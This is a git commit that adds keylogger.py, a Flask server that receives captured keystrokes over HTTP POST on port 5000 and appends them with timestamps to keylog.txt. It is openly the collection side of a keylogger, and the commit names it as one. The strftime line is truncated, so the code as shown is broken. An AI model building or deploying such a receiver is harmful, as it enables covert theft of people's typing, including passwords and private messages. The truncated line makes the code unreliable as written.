0478e25b5b39060d35a57941046902c6b389336b
klgnsechk <closerrlmdmdenktss@gmail.com>
2025-08-14 22:06:12 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,1 +1,23 @@
+from flask import Flask, request
+import datetime
 
+app = Flask(__name__)
+LOG_FILE = "keylog.txt"
+
+@app.route('/')
+def home():
+    return "Keylogger Sunucusu Aktif!"
+
+@app.route('/log', methods=['POST'])
+def log_key():
+    data = request.get_json()
+    key_data = data.get('key')
+    timestamp = datetime.datetime.now().strftime("%Y->
+    log_entry = f"[{timestamp}] {key_data}"
+    print(log_entry)  # Terminale yaz
+    with open(LOG_FILE, "a") as f:
+        f.write(log_entry + "\n")
+    return "Logged", 200
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
